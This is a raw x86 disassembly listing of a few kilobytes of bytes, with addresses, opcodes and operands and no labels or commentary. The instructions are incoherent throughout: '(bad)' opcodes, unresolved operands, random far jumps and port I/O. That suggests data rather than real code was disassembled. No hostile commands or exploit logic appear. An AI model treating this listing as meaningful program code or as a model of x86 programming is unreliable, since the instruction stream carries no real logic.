  41fed6:	mov    esp,0xed02b5a9
  41fedb:	addr16 mov cl,0x52
  41fede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fedf:	iret   
  41fee0:	les    ebx,FWORD PTR [esi]
  41fee2:	std    
  41fee3:	neg    BYTE PTR [edi]
  41fee5:	ds fs add eax,0xa2a00838
  41feec:	fcomp  QWORD PTR [edx+0x5e312d97]
  41fef2:	jmp    0xb7f6ac1c
  41fef7:	adc    bh,BYTE PTR [ecx-0x2]
  41fefa:	shl    ecx,cl
  41fefc:	pop    es
  41fefd:	in     al,0x76
  41feff:	sbb    esi,edx
  41ff01:	jno    0x41fe84
  41ff03:	test   BYTE PTR [eax+0x10],cl
  41ff06:	cdq    
  41ff07:	push   es
  41ff08:	or     BYTE PTR [edi],al
  41ff0a:	jmp    0xb3c8e381
  41ff0f:	mov    al,0xb5
  41ff11:	not    ah
  41ff13:	pop    ecx
  41ff14:	dec    eax
  41ff15:	loop   0x41feae
  41ff17:	imul   esi,DWORD PTR [edi-0x17],0xffffffd8
  41ff1b:	rcl    DWORD PTR [edi],1
  41ff1d:	jg     0x41ff82
  41ff1f:	ins    BYTE PTR es:[edi],dx
  41ff20:	add    al,0x94
  41ff22:	loopne 0x41ff1c
  41ff24:	add    al,0x3e
  41ff26:	jmp    0x41ff19
  41ff28:	cmp    eax,ebp
  41ff2a:	push   edx
  41ff2b:	xor    al,0x76
  41ff2d:	(bad)  
  41ff2e:	mov    ?,WORD PTR [ecx+0x5c]
  41ff31:	inc    edi
  41ff32:	dec    esi
  41ff33:	sbb    al,0x79
  41ff35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff36:	xchg   edi,eax
  41ff37:	push   es
  41ff38:	fstp   TBYTE PTR [eax-0x71a60300]
  41ff3e:	add    BYTE PTR [edx+edx*1-0x3],bh
  41ff42:	mov    bh,BYTE PTR [eax-0x8a78a05]
  41ff48:	into   
  41ff49:	pop    ds
  41ff4a:	repnz into 
  41ff4c:	cwde   
  41ff4d:	and    esi,0x4419da1
  41ff53:	in     eax,dx
  41ff54:	pop    edi
  41ff55:	mov    edi,0x9fda94d2
  41ff5a:	xor    bh,0xb9
  41ff5d:	adc    ebx,eax
  41ff5f:	add    al,0x48
  41ff61:	cwde   
  41ff62:	std    
  41ff63:	pop    esp
  41ff64:	and    dl,ch
  41ff66:	push   ss
  41ff67:	xchg   ebp,eax
  41ff68:	mov    al,ds:0xf0e9ff1e
  41ff6d:	mov    WORD PTR [ecx+0x38],?
  41ff70:	pop    eax
  41ff71:	sub    BYTE PTR [edi+0x7e],bh
  41ff74:	sub    eax,DWORD PTR [esi-0x6e91279f]
  41ff7a:	lea    ebx,[esi]
  41ff7c:	mov    bh,0x47
  41ff7e:	mov    edi,0xe5db57d4
  41ff83:	adc    dh,BYTE PTR [edi]
  41ff85:	push   edx
  41ff86:	cmp    edi,DWORD PTR [eax-0x2fa0d316]
  41ff8c:	inc    edi
  41ff8d:	mov    esi,0x1125866b
  41ff92:	ss out 0x98,eax
  41ff95:	bound  eax,QWORD PTR [ebp+0x11]
  41ff98:	sbb    ebx,DWORD PTR [ecx-0x33]
  41ff9b:	pop    edx
  41ff9c:	cwde   
  41ff9d:	aad    0x94
  41ff9f:	arpl   WORD PTR [edx+0x2a],dx
  41ffa2:	jl     0x41ffa9
  41ffa4:	xor    al,0x1e
  41ffa6:	sub    al,0x2b
  41ffa8:	test   DWORD PTR [ebx+edi*2+0x67],ebx
  41ffac:	fcmovbe st,st(7)
  41ffae:	adc    bh,BYTE PTR ds:0x5e03e659
  41ffb4:	fbstp  TBYTE PTR [edi-0x31b025e7]
  41ffba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffbb:	jge    0x41ffd0
  41ffbd:	gs ja  0x41ff67
  41ffc0:	add    esi,DWORD PTR [edx+0x67cf1648]
  41ffc6:	cmp    al,ah
  41ffc8:	dec    esp
  41ffc9:	mov    al,ds:0x4d94f974
  41ffce:	mul    BYTE PTR [ebx+0x2a5f109c]
  41ffd4:	and    ah,ah
  41ffd6:	jnp    0x420023
  41ffd8:	(bad)  
  41ffd9:	pop    esi
  41ffda:	xchg   ecx,eax
  41ffdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffdc:	adc    DWORD PTR ds:0x9ce4adb6,ebx
  41ffe2:	jo     0x42000a
  41ffe4:	out    0x9c,eax
  41ffe6:	jno    0x42005a
  41ffe8:	outs   dx,BYTE PTR ds:[esi]
  41ffe9:	arpl   WORD PTR [ebx],di
  41ffeb:	mov    dl,0x4
  41ffed:	xlat   BYTE PTR ds:[ebx]
  41ffee:	xor    al,BYTE PTR es:[ebp+ecx*2+0x33cd698c]
  41fff6:	inc    edi
  41fff7:	push   eax
  41fff8:	arpl   bx,di
  41fffa:	add    ebp,DWORD PTR [ecx]
  41fffc:	pop    ds
  41fffd:	adc    dl,0x2b
  420000:	push   ebx
  420001:	cdq    
  420002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420003:	not    BYTE PTR [edi+0x74]
  420006:	push   eax
  420007:	outs   dx,DWORD PTR ds:[esi]
  420008:	or     DWORD PTR [eax+0x5b],ebp
  42000b:	test   BYTE PTR [eax+0x69],bl
  42000e:	sub    eax,0xb702c2e6
  420013:	lahf   
  420014:	dec    edi
  420015:	adc    al,0x73
  420017:	fmul   st(3),st
  420019:	fistp  WORD PTR [eax]
  42001b:	jmp    0xc5ce:0x74508e17
  420022:	stos   BYTE PTR es:[edi],al
  420023:	inc    ebp
  420024:	or     esi,DWORD PTR [edx]
  420026:	es inc edx
  420028:	sbb    DWORD PTR [bp+si+0x239e],edi
  42002d:	xlat   BYTE PTR ds:[ebx]
  42002e:	test   al,0x75
  420030:	xchg   edx,eax
  420031:	int3   
  420032:	push   es
  420033:	loopne 0x42000e
  420035:	jmp    0x41ffb8
  420037:	loope  0x420047
  420039:	push   0x599ee0d6
  42003e:	into   
  42003f:	xor    BYTE PTR [ebp+0x28492df6],0x56
  420046:	inc    edx
  420047:	cld    
  420048:	sbb    BYTE PTR [edx],0x66
  42004b:	mov    edx,0x3d50de96
  420050:	mov    ecx,0x9512e9fd
  420055:	gs popf 
  420057:	clc    
  420058:	xor    BYTE PTR [ecx-0x43ddf69],0x65
  42005f:	sub    esp,DWORD PTR [ebp+0x3a]
  420062:	dec    edi
  420063:	adc    eax,0x5afcccb1
  420068:	in     eax,0xb0
  42006a:	jae    0x420000
  42006c:	jecxz  0x41fff3
  42006e:	push   ecx
  42006f:	mov    edi,0x62b95739
  420074:	arpl   WORD PTR [ebx+ecx*1+0xe],dx
  420078:	out    0xac,al
  42007a:	mov    esp,0x13528687
  42007f:	rcl    BYTE PTR [esi-0x5b],1
  420082:	ret    0xb085
  420085:	dec    ebp
  420086:	in     al,dx
  420087:	xchg   ecx,eax
  420088:	sub    ecx,DWORD PTR [esi+eax*2+0x13]
  42008c:	retf   0x1c7e
  42008f:	ret    
  420090:	in     eax,dx
  420091:	xor    ch,BYTE PTR [esi-0x4a]
  420094:	mov    dl,0xe
  420096:	ret    0xa749
  420099:	loopne 0x4200f4
  42009b:	or     DWORD PTR [ebp+0x6e],ebx
  42009e:	xchg   esi,edx
  4200a0:	mov    cl,0x7f
  4200a2:	das    
  4200a3:	or     al,0x5c
  4200a5:	push   0xffffffdd
  4200a7:	fs scas eax,DWORD PTR es:[edi]
  4200a9:	ins    DWORD PTR es:[edi],dx
  4200aa:	jne    0x42007d
  4200ac:	pop    edi
  4200ad:	aaa    
  4200ae:	int3   
  4200af:	xlat   BYTE PTR ds:[ebx]
  4200b0:	loop   0x42007b
  4200b2:	or     al,0xb1
  4200b4:	(bad)  
  4200b5:	sahf   
  4200b6:	and    eax,0x79ddee49
  4200bb:	addr16 sbb al,bl
  4200be:	fnstenv [ecx-0x2f1aa3b9]
  4200c4:	ja     0x420062
  4200c6:	pop    es
  4200c7:	in     eax,0x95
  4200c9:	fnstsw WORD PTR [ecx+0x1d720eab]
  4200cf:	adc    BYTE PTR [ecx+0x2c083a80],bl
  4200d5:	xchg   edx,eax
  4200d6:	inc    ebp
  4200d7:	in     al,dx
  4200d8:	adc    al,0x77
  4200da:	push   ds
  4200db:	mov    ?,WORD PTR [edx-0x7ddec71c]
  4200e1:	or     BYTE PTR [ecx+0x5a120ed5],bl
  4200e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200e8:	jbe    0x4200d7
  4200ea:	fadd   DWORD PTR [eax-0x32]
  4200ed:	leave  
  4200ee:	scas   al,BYTE PTR es:[edi]
  4200ef:	jp     0x420152
  4200f1:	gs dec esp
  4200f3:	or     al,0x27
  4200f5:	repnz and DWORD PTR ds:0xc3a85f1f,eax
  4200fc:	and    al,0x59
  4200fe:	retf   0xfc84
  420101:	aas    
  420102:	inc    eax
  420104:	repz scas al,BYTE PTR es:[edi]
  420106:	adc    eax,esi
  420108:	ins    BYTE PTR es:[edi],dx
  420109:	mov    edi,0x65e0f3f0
  42010e:	sbb    ecx,DWORD PTR [ebp-0x1d]
  420111:	cwde   
  420112:	stos   BYTE PTR es:[edi],al
  420113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420114:	mov    cs,WORD PTR [edx+0x7e]
  420117:	jg     0x420168
  420119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42011a:	ins    DWORD PTR es:[edi],dx
  42011b:	mov    ds:0x1f1c8708,al
  420120:	ins    BYTE PTR es:[edi],dx
  420121:	ins    DWORD PTR es:[edi],dx
  420122:	scas   al,BYTE PTR es:[edi]
  420123:	jns    0x42011d
  420125:	nop
  420126:	xchg   ebx,ebp
  420128:	sbb    dh,BYTE PTR [ecx+ebp*4]
  42012b:	fsubr  st(7),st
  42012d:	ja     0x4200e2
  42012f:	xor    al,0x7f
  420131:	jmp    0x45641b4
  420136:	pop    edx
  420137:	fcmovnb st,st(0)
  420139:	xor    BYTE PTR [eax+0x71cfe342],bl
  42013f:	mov    al,ds:0xc23ac932
  420144:	mov    ?,WORD PTR [ebp-0x3e36a20e]
  42014a:	or     DWORD PTR [esi-0x4e2b03d4],esp
  420150:	mov    edx,0xa458dd1b
  420155:	and    bl,dl
  420157:	push   eax
  420158:	cmp    DWORD PTR ds:0x145dc27,0xd0a97769
  420162:	jg     0x42015f
  420164:	out    0x99,eax
  420166:	(bad)  
  420167:	or     esi,DWORD PTR [ebx-0x769985c7]
  42016d:	sbb    BYTE PTR [esi-0x493ece4d],ah
  420173:	mov    bl,0x5
  420175:	ja     0x420169
  420177:	clc    
  420178:	cmp    esi,DWORD PTR [ebx+0x34]
  42017b:	adc    ecx,DWORD PTR [ecx]
  42017d:	mov    ss,WORD PTR [ecx-0x23]
  420180:	cmp    ecx,ebx
  420182:	xchg   edi,eax
  420183:	push   0x64
  420185:	xchg   edi,eax
  420186:	add    BYTE PTR [esi+0x2],ah
  420189:	sub    eax,0xe4e8121
  42018e:	imul   ecx,DWORD PTR [ebp-0xc],0x2b2babe5
  420195:	cld    
  420196:	int3   
  420197:	leave  
  420198:	add    eax,0x4e27a7c1
  42019d:	xchg   ebx,eax
  42019e:	and    eax,0x48fe321c
  4201a3:	aaa    
  4201a4:	dec    ecx
  4201a5:	call   0x7590:0xf20ed43e
  4201ac:	dec    ebp
  4201ad:	pop    ebx
  4201ae:	push   cs
  4201af:	inc    eax
  4201b0:	in     al,0x45
  4201b2:	jle    0x420222
  4201b4:	stos   BYTE PTR es:[edi],al
  4201b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201b6:	add    al,BYTE PTR [esi+0x41]
  4201b9:	sti    
  4201ba:	mov    ds:0x93830243,al
  4201bf:	add    bl,BYTE PTR [edx+edi*2+0x74c84ff5]
  4201c6:	adc    BYTE PTR [ecx+0xf39ed05],0x5d
  4201cd:	adc    cl,BYTE PTR [esi-0x5746e685]
  4201d3:	in     eax,0x21
  4201d5:	mov    ds:0x338519ad,al
  4201da:	(bad)  
  4201db:	lods   al,BYTE PTR ds:[esi]
  4201dc:	sbb    bl,dl
  4201de:	ins    DWORD PTR es:[edi],dx
  4201df:	dec    edx
  4201e0:	les    edi,FWORD PTR ds:0x37e7a394
  4201e6:	xchg   BYTE PTR ds:0xe12a5360,bl
  4201ec:	leave  
  4201ed:	gs mov ah,0x96
  4201f0:	lea    edx,[edi+ecx*2+0x2a]
  4201f4:	jns    0x420182
  4201f6:	dec    esp
  4201f7:	dec    ebp
  4201f8:	jnp    0x420223
  4201fa:	xchg   BYTE PTR [edi-0x33ec9a84],al
  420200:	push   ds
  420201:	cdq    
  420202:	mov    edi,0x37f0206c
  420207:	xor    DWORD PTR [ecx-0x230bc9b0],eax
  42020d:	mov    ebx,0xdc1d3a67
  420212:	fstp   st(1)
  420214:	cdq    
  420215:	sar    DWORD PTR [edi-0x696aad93],1
  42021b:	loopne 0x4201bc
  42021d:	add    eax,0x5d962917
  420222:	jns    0x420241
  420224:	stos   DWORD PTR es:[edi],eax
  420225:	pop    ecx
  420226:	xor    eax,0x6eec32cf
  42022b:	(bad)  
  42022c:	fiadd  WORD PTR [ebx+0x97af2d0]
  420232:	lock jno 0x42025f
  420235:	in     al,0xd7
  420237:	sub    DWORD PTR [ebx-0x7d008eb6],edx
  42023d:	aad    0xa8
  42023f:	data16 aaa 
  420241:	push   cs
  420242:	sbb    al,0xe5
  420244:	adc    al,0x39
  420246:	pop    edx
  420247:	dec    esi
  420248:	push   edx
  420249:	and    ebp,ebp
  42024b:	icebp  
  42024c:	lds    edi,FWORD PTR [edx-0x8]
  42024f:	or     DWORD PTR [ebx+0xe],edi
  420252:	adc    DWORD PTR [ebx],esp
  420254:	push   ecx
  420255:	fadd   QWORD PTR [edx+0x28]
  420258:	cmp    al,0xf7
  42025a:	pop    ecx
  42025b:	mov    ebp,0xa3157f40
  420260:	xchg   esi,eax
  420261:	pop    esp
  420262:	stc    
  420263:	sbb    ch,BYTE PTR [ebx]
  420265:	in     eax,0x0
  420267:	mov    esp,DWORD PTR [ecx-0x4]
  42026a:	dec    edx
  42026b:	test   DWORD PTR [edx+0x56],edi
  42026e:	nop
  42026f:	call   0xf3af:0xe1001dab
  420276:	jge    0x42020d
  420278:	cmc    
  420279:	xlat   BYTE PTR ds:[ebx]
  42027a:	sti    
  42027b:	int3   
  42027c:	xchg   esp,eax
  42027d:	call   0xaab6:0xd5abe8f2
  420284:	aas    
  420285:	ffreep st(4)
  420287:	jae    0x4202b6
  420289:	retf   
  42028a:	cmp    bh,BYTE PTR [edi+0x70]
  42028d:	mov    eax,ds:0x517e40c8
  420292:	push   0x28
  420294:	mov    ebx,?
  420296:	aaa    
  420297:	sub    al,0x5a
  420299:	add    ch,dh
  42029b:	ret    
  42029c:	ret    
  42029d:	js     0x4202d2
  42029f:	fnstsw WORD PTR [eax-0x2b455c0c]
  4202a5:	fsubr  st,st(7)
  4202a7:	fsub   DWORD PTR [edx-0x692bba32]
  4202ad:	jne    0x420304
  4202af:	xchg   esi,eax
  4202b0:	push   ds
  4202b1:	inc    ebp
  4202b2:	push   cs
  4202b3:	arpl   dx,dx
  4202b5:	arpl   WORD PTR [ebx],bp
  4202b7:	aam    0x2c
  4202b9:	adc    BYTE PTR [edi],al
  4202bb:	cwde   
  4202bc:	mov    ah,0xaf
  4202be:	test   al,0xde
  4202c0:	aam    0x73
  4202c2:	fsincos 
  4202c4:	test   BYTE PTR [edi+0x19],ah
  4202c7:	int3   
  4202c8:	xchg   DWORD PTR [ebx],ecx
  4202ca:	xchg   edi,eax
  4202cb:	aam    0x72
  4202cd:	je     0x4202a5
  4202cf:	or     BYTE PTR [esi],dh
  4202d1:	mov    eax,gs
  4202d3:	mov    fs,esp
  4202d5:	push   ds
  4202d6:	mov    dh,0x85
  4202d8:	mov    ds:0x76d961e5,al
  4202dd:	mov    cl,0xc4
  4202df:	adc    BYTE PTR [esp+ebp*1],dh
  4202e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202e4:	sub    BYTE PTR [edx-0x66],cl
  4202e7:	pop    ss
  4202e8:	xor    DWORD PTR [eax-0x3a],0x18
  4202ec:	pop    ecx
  4202ed:	push   es
  4202ee:	or     bl,cl
  4202f0:	(bad)  
  4202f1:	fdiv   DWORD PTR [edi+0x42]
  4202f4:	daa    
  4202f5:	mov    ah,0x84
  4202f7:	ins    BYTE PTR es:[edi],dx
  4202f8:	or     DWORD PTR [ebx-0x23],esp
  4202fb:	xchg   DWORD PTR gs:[eax],ebp
  4202fe:	xchg   esp,eax
  4202ff:	lods   ax,WORD PTR ds:[esi]
  420301:	cwde   
  420302:	gs ret 0x857c
  420306:	and    bl,BYTE PTR [eax+0x198b7bcb]
  42030c:	fld    DWORD PTR [ebx]
  42030e:	in     al,dx
  42030f:	xchg   DWORD PTR [esi+0x58],edx
  420312:	fsubr  QWORD PTR [ebx-0x78]
  420315:	into   
  420316:	pop    ebp
  420317:	push   esi
  420318:	fsub   DWORD PTR [edx+0x23]
  42031b:	in     eax,dx
  42031c:	pop    ebp
  42031d:	dec    edx
  42031e:	les    ebx,FWORD PTR [ebx]
  420320:	fdivr  QWORD PTR [eax+0x42]
  420323:	sbb    cl,bl
  420325:	shr    BYTE PTR [esi+0x45],1
  420328:	rol    DWORD PTR [ecx+0x52],0x43
  42032c:	sub    eax,0x9f140c11
  420331:	(bad)  
  420332:	in     al,0x66
  420334:	neg    BYTE PTR [edi+0x79]
  420337:	dec    ebp
  420338:	add    DWORD PTR [esi+0x16],edx
  42033b:	adc    BYTE PTR [esi],bl
  42033d:	lods   eax,DWORD PTR ds:[esi]
  42033e:	jmp    0x4202fb
  420340:	sbb    eax,0x1b8ec839
  420345:	cmp    dl,BYTE PTR [ebx]
  420347:	por    mm2,QWORD PTR [eax+edx*1-0x77]
  42034c:	xchg   ch,ch
  42034e:	jae    0x4203ac
  420350:	repz pop esi
  420352:	scas   al,BYTE PTR es:[edi]
  420353:	sti    
  420354:	jmp    0x5659:0xd950ce08
  42035b:	adc    BYTE PTR [eax+0x1f],0x5f
  42035f:	scas   eax,DWORD PTR es:[edi]
  420360:	jns    0x42034b
  420362:	or     ch,ah
  420364:	push   esi
  420365:	mov    al,ds:0x355f1172
  42036a:	iret   
  42036b:	push   eax
  42036c:	fdiv   st,st(1)
  42036e:	jnp    0x420394
  420370:	cmp    BYTE PTR [esi],al
  420372:	jbe    0x4203de
  420374:	xchg   edx,eax
  420375:	xor    BYTE PTR [esi-0x55bb74e1],0x29
  42037c:	gs sbb al,0xc9
  42037f:	fadd   DWORD PTR [edx]
  420381:	pop    ebx
  420382:	push   ebp
  420383:	mov    ebx,0x4859ec59
  420388:	icebp  
  420389:	dec    eax
  42038a:	mov    dh,BYTE PTR [edx-0x53]
  42038d:	scas   eax,DWORD PTR es:[edi]
  42038e:	mov    ds:0x81ff4956,ax
  420394:	jnp    0x420318
  420396:	sub    al,0x46
  420398:	dec    edx
  420399:	xchg   edx,eax
  42039a:	sub    BYTE PTR [esi],dl
  42039c:	push   cs
  42039d:	data16 (bad) 
  42039f:	ja     0x420342
  4203a1:	add    esi,esp
  4203a3:	mov    ?,WORD PTR [edi+eiz*2-0x5b63b869]
  4203aa:	adc    al,0x94
  4203ac:	scas   eax,DWORD PTR es:[edi]
  4203ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203ae:	retf   0x5e3a
  4203b1:	ss pop ss
  4203b3:	xchg   ebp,eax
  4203b4:	inc    ebx
  4203b5:	mov    eax,0x141bbffb
  4203ba:	aas    
  4203bb:	fisub  DWORD PTR [edx+0x44]
  4203be:	das    
  4203bf:	inc    esp
  4203c0:	sbb    al,0xaa
  4203c2:	out    dx,eax
  4203c3:	mov    BYTE PTR [ecx-0x4],cl
  4203c6:	and    BYTE PTR [ebx+0x1f],bl
  4203c9:	leave  
  4203ca:	addr16 (bad) 
  4203cc:	(bad)  
  4203cd:	les    ecx,FWORD PTR [ecx-0xde8c063]
  4203d3:	das    
  4203d4:	xchg   bh,bh
  4203d6:	cmp    ah,dh
  4203d8:	clc    
  4203d9:	cmp    DWORD PTR [ebp+ecx*1-0x474f5bd9],ebx
  4203e0:	inc    edi
  4203e1:	jle    0x4203e9
  4203e3:	xchg   edx,eax
  4203e4:	out    dx,al
  4203e5:	lods   al,BYTE PTR ds:[esi]
  4203e6:	xchg   DWORD PTR [ebx],esp
  4203e8:	and    DWORD PTR [ebx-0x3ddb39ef],esp
  4203ee:	mov    esi,0x592031f9
  4203f3:	jb     0x420450
  4203f5:	mov    bl,0x2d
  4203f7:	ror    BYTE PTR [ecx+ecx*4],1
  4203fa:	push   es
  4203fb:	rcr    BYTE PTR es:[edx+0x3a755500],1
  420402:	jg     0x42041a
  420404:	dec    edi
  420405:	cmp    al,dl
  420407:	ror    DWORD PTR [ebx-0x38],cl
  42040a:	test   al,0x8e
  42040c:	and    ebx,0x41fd7d09
  420412:	bound  ecx,QWORD PTR [ebx+0x1a]
  420415:	xor    eax,0x7e93bb41
  42041a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42041b:	popf   
  42041c:	add    edi,ecx
  42041e:	xchg   esi,eax
  42041f:	popa   
  420420:	add    al,0x6e
  420422:	dec    eax
  420423:	fdiv   DWORD PTR [ebp-0x176d4097]
  420429:	ficom  DWORD PTR [esi+eiz*1-0x64ccb953]
  420430:	adc    esp,DWORD PTR [ebx+ecx*1]
  420433:	loope  0x420415
  420435:	xchg   edx,eax
  420436:	jp     0x4203ca
  420438:	dec    ebp
  420439:	mov    ds:0x8220fca6,al
  42043e:	gs stos DWORD PTR es:[edi],eax
  420440:	mov    bh,ch
  420442:	daa    
  420443:	je     0x420478
  420445:	and    ebx,ebx
  420447:	dec    edi
  420448:	sar    esp,0xa
  42044b:	or     BYTE PTR [edx-0x10],bl
  42044e:	pop    edx
  42044f:	mov    WORD PTR [ecx+0x64ac22bc],es
  420455:	mov    bl,0xfb
  420457:	xchg   DWORD PTR [ebx-0x59],esp
  42045a:	xchg   ecx,eax
  42045b:	push   eax
  42045c:	clc    
  42045d:	dec    ebx
  42045e:	popf   
  42045f:	in     eax,0x3a
  420461:	rcl    BYTE PTR [eax+0x47],1
  420464:	fisubr DWORD PTR [edx-0x1cbbe502]
  42046a:	stc    
  42046b:	push   ebp
  42046c:	jp     0x4204c7
  42046e:	cmp    DWORD PTR [esi-0x4b],edx
  420471:	int    0xef
  420473:	fcmovb st,st(0)
  420475:	sub    eax,0xf633c74e
  42047a:	xor    al,0x95
  42047c:	sbb    DWORD PTR [eax+0x56b578bf],esi
  420482:	xchg   esi,eax
  420483:	jl     0x4204a7
  420485:	ins    DWORD PTR es:[edi],dx
  420486:	mov    bl,0x6
  420488:	pop    edi
  420489:	adc    eax,0x11fb79fd
  42048e:	pop    ss
  42048f:	xchg   edi,eax
  420490:	cmp    DWORD PTR [esi-0x151de8c8],esp
  420496:	mov    eax,ds:0x18a48888
  42049b:	add    al,0x61
  42049d:	adc    esi,DWORD PTR [ecx-0x55]
  4204a0:	pusha  
  4204a1:	pop    eax
  4204a2:	mov    ebx,0xd88ebb3f
  4204a7:	sub    ah,dh
  4204a9:	les    ebx,FWORD PTR [eax]
  4204ab:	sbb    esp,ebx
  4204ad:	imul   ebx,DWORD PTR [esi],0xfffffffe
  4204b0:	cdq    
  4204b1:	inc    esi
  4204b2:	les    edx,FWORD PTR [edx+0x22]
  4204b5:	fild   DWORD PTR [esi+0x6e]
  4204b8:	ja     0x4204da
  4204ba:	mov    dh,0x4c
  4204bc:	repnz or al,0x3b
  4204bf:	adc    al,0xd1
  4204c1:	ss rol bh,0x62
  4204c5:	pop    es
  4204c6:	pop    ebp
  4204c7:	loopne 0x42048c
  4204c9:	ret    
  4204ca:	into   
  4204cb:	mov    edx,0x589bad5c
  4204d0:	or     dh,BYTE PTR [ecx-0x2cdfbae4]
  4204d6:	enter  0x42cd,0x7d
  4204da:	jl     0x420536
  4204dc:	add    edx,DWORD PTR [edx-0x1a]
  4204df:	loop   0x420497
  4204e1:	test   DWORD PTR [ecx-0x4afbdb81],ecx
  4204e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204e8:	jb     0x42053e
  4204ea:	fdiv   QWORD PTR [eax+0x118ea33b]
  4204f0:	push   cs
  4204f1:	iret   
  4204f2:	pop    es
  4204f3:	neg    BYTE PTR [edx+0x17]
  4204f6:	push   edi
  4204f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204f8:	inc    ecx
  4204f9:	push   edi
  4204fa:	cmc    
  4204fb:	repz dec edi
  4204fd:	pop    eax
  4204fe:	popf   
  4204ff:	xor    cl,dh
  420501:	mov    ebp,0x90fea697
  420506:	inc    ecx
  420507:	add    bh,ah
  420509:	fiadd  DWORD PTR [edx+0x30]
  42050c:	xor    ebx,0x50
  42050f:	sub    ch,0xcc
  420512:	int3   
  420513:	jb     0x4204fe
  420515:	inc    eax
  420516:	js     0x4204b2
  420518:	and    al,0x4b
  42051a:	sub    BYTE PTR [ebx],bh
  42051c:	xor    BYTE PTR [esi+ecx*2-0x2b],bh
  420520:	and    DWORD PTR [edi+0x56],ecx
  420523:	dec    esi
  420524:	sbb    bl,ah
  420526:	popa   
  420527:	out    dx,al
  420528:	ins    DWORD PTR es:[edi],dx
  420529:	(bad)  
  42052a:	rcr    BYTE PTR [ebx+0x7e84cdf0],cl
  420530:	aaa    
  420531:	dec    esi
  420532:	pop    esi
  420533:	pop    ss
  420534:	out    0x26,eax
  420536:	sbb    BYTE PTR [esi+ebp*8+0x68ea7667],0x3e
  42053e:	cmp    eax,0x31ca4831
  420543:	mov    ah,0xff
  420545:	(bad)  
  420546:	mov    edx,0x4e86846f
  42054b:	push   edi
  42054c:	xor    BYTE PTR [edi-0x2d98b150],dh
  420552:	mov    esp,0x6bd0978e
  420557:	lods   eax,DWORD PTR ds:[esi]
  420558:	push   edi
  420559:	gs (bad) 
  42055b:	jl     0x420519
  42055d:	lods   eax,DWORD PTR ds:[esi]
  42055e:	mov    ds:0x6f64336c,al
  420563:	in     eax,0x81
  420565:	pusha  
  420566:	and    eax,0xa2641233
  42056b:	fidivr DWORD PTR [eax]
  42056d:	jmp    0x599c:0x86b349cd
  420574:	leave  
  420575:	imul   ebp,DWORD PTR es:[eax-0x6df7044a],0x875993b3
  420580:	repz icebp 
  420582:	push   esi
  420583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420584:	ret    0xe5f5
  420587:	into   
  420588:	mov    bh,0xc0
  42058a:	cmp    eax,0xc781312d
  42058f:	fadd   DWORD PTR [eax]
  420591:	push   ebx
  420592:	mov    bl,0xb3
  420594:	iret   
  420595:	enter  0x2319,0x46
  420599:	in     al,0x3c
  42059b:	out    0x84,al
  42059d:	ins    DWORD PTR es:[edi],dx
  42059e:	sbb    eax,0x5aaa7940
  4205a3:	test   al,0x14
  4205a5:	int    0x1
  4205a7:	repz jecxz 0x42061f
  4205aa:	popa   
  4205ab:	xor    DWORD PTR es:[eax-0x124b959c],0x18
  4205b3:	push   0x68691f7c
  4205b8:	jb     0x420623
  4205ba:	add    al,0x45
  4205bc:	int3   
  4205bd:	retf   
  4205be:	dec    eax
  4205bf:	into   
  4205c0:	ins    BYTE PTR es:[edi],dx
  4205c1:	push   edx
  4205c2:	mov    esp,0xfb4c2942
  4205c7:	sbb    DWORD PTR [eax-0x16],ebx
  4205ca:	cmp    al,0x3
  4205cc:	imul   eax,eax,0x49
  4205cf:	out    dx,al
  4205d0:	jl     0x42055c
  4205d2:	inc    BYTE PTR [ebx]
  4205d4:	push   0xd43f46c5
  4205d9:	dec    ecx
  4205da:	das    
  4205db:	ja     0x4205ba
  4205dd:	fwait
  4205de:	hlt    
  4205df:	in     eax,dx
  4205e0:	add    cl,dl
  4205e2:	add    cl,ch
  4205e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205e5:	dec    esi
  4205e6:	inc    eax
  4205e7:	cmp    ebx,0xa754e4e2
  4205ed:	jae    0x42064d
  4205ef:	(bad)  
  4205f0:	cli    
  4205f1:	gs lahf 
  4205f3:	add    eax,0x7bc7a4a4
  4205f8:	inc    esi
  4205f9:	in     eax,dx
  4205fa:	mov    ebx,0xc2dea4c4
  4205ff:	ins    BYTE PTR es:[edi],dx
  420600:	xchg   ebp,eax
  420601:	dec    esp
  420602:	jae    0x4205b5
  420604:	and    bh,dh
  420606:	adc    al,0xbd
  420608:	cld    
  420609:	xchg   edx,eax
  42060a:	mov    esp,0x6de5230d
  42060f:	idiv   BYTE PTR [esi+0x44aadb2d]
  420615:	ss sbb ebp,esp
  420618:	add    eax,0xaca3cbf2
  42061d:	pop    ds
  42061e:	test   BYTE PTR [ebx+ecx*1+0x5b8d7019],al
  420625:	into   
  420626:	es sbb eax,0x89f55193
  42062c:	das    
  42062d:	sti    
  42062e:	fld    TBYTE PTR [edx+0x301f57fb]
  420634:	imul   ebx,DWORD PTR [edx-0x4daffb3d],0x7c71cdeb
  42063e:	mov    ch,0x1b
  420640:	mov    al,0xc2
  420642:	sbb    esi,DWORD PTR [esi+0x2913f836]
  420648:	push   esi
  420649:	(bad)  
  42064a:	fdivr  DWORD PTR [esi+0x17318143]
  420650:	pop    es
  420651:	jae    0x42062e
  420653:	push   es
  420654:	fadd   DWORD PTR ds:0x3522e798
  42065a:	idiv   edi
  42065c:	xor    BYTE PTR [edx+ebx*8+0x3334a408],ch
  420663:	fcmovb st,st(4)
  420665:	int    0x8c
  420667:	rol    DWORD PTR [ecx],1
  420669:	pop    es
  42066a:	das    
  42066b:	add    al,0x64
  42066d:	icebp  
